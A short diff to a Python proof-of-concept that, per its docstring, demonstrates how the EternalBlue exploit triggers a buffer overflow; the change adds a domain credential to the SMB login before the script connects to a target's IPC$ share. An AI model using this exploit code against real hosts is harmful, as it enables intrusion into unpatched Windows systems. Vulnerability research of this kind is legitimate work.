@@ -8,8 +8,9 @@ import sys
 PoC: demonstrates how NSA eternalblue triggers the buffer overflow
 '''
 
-USERNAME = ''
-PASSWORD = ''
+USERNAME = ''		#Edit username
+PASSWORD = ''		#Edit password
+DOMAIN = ''		#Edit domain
 
 if len(sys.argv) != 2:
 	print("{} <ip>".format(sys.argv[0]))
@@ -19,7 +20,7 @@ target = sys.argv[1]
 
 
 conn = MYSMB(target)
-conn.login(USERNAME, PASSWORD)
+conn.login(USERNAME, PASSWORD, DOMAIN)
 
 tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
 conn.set_default_tid(tid)
